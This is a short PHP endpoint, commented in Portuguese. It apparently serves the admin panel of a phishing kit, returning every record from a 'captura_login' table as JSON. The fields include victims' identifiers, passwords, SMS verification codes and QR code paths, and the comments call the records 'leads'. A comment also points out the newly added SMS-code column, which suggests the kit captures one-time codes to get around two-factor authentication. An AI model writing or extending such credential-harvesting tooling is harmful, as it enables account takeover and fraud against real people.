<?php
// Define que a resposta será no formato JSON
header('Content-Type: application/json');

// Inclui o arquivo de conexão com o banco de dados
require 'db.php';

try {
    // Prepara a consulta SQL para buscar todos os campos necessários de todos os registros.
    // **Ajuste principal: Adicionamos a coluna 'sms_code' ao SELECT.**
    // Ordenamos por 'id DESC' para que os leads mais recentes apareçam primeiro no painel.
    $stmt = $pdo->prepare(
        "SELECT 
            id, 
            session_id, 
            identificador, 
            senha, 
            sms_code, -- <<< CAMPO ADICIONADO
            qrcode_path, 
            status, 
            data_criacao 
        FROM 
            captura_login 
        ORDER BY 
            id DESC"
    );
    
    // Executa a consulta
    $stmt->execute();

    // Busca todos os resultados em um array associativo
    $capturas = $stmt->fetchAll(PDO::FETCH_ASSOC);

    // Retorna o array de capturas como uma resposta JSON
    echo json_encode($capturas);

} catch (PDOException $e) {
    // Em caso de erro com o banco de dados, retorna uma resposta de erro em JSON
    // para que o painel de admin possa tratar o erro.
    http_response_code(500); // Define o código de status HTTP para Erro de Servidor
    echo json_encode(['success' => false, 'error' => 'Erro ao consultar o banco de dados: ' . $e->getMessage()]);
}
?>